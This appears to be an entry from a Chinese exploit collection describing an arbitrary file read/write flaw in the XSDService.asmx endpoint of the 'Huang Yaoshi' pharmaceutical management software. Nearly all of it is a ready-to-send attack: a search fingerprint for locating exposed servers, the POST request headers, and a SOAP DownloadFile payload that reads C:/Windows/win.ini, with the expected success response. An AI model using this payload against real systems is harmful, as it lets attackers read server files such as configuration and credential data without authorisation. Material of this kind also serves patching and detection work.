# 黄药师药业管理软件XSDService.asmx存在任意文件读取漏洞

- **系统**：黄药师药业管理软件　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="XSDService.asmx"`
- **请求**：`POST /XSDService.asmx HTTP/1.1`
- **关键头**：`Content-Length: 499`　`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/DownloadFile"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<DownloadFile xmlns="http://tempuri.org/">
<filePath>C:/Windows</filePath>
<fileName>win.ini</fileName>
<Offset>1</Offset>
<readLength>9</readLength>
<buffer>base64Binary</buffer>
</DownloadFile>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—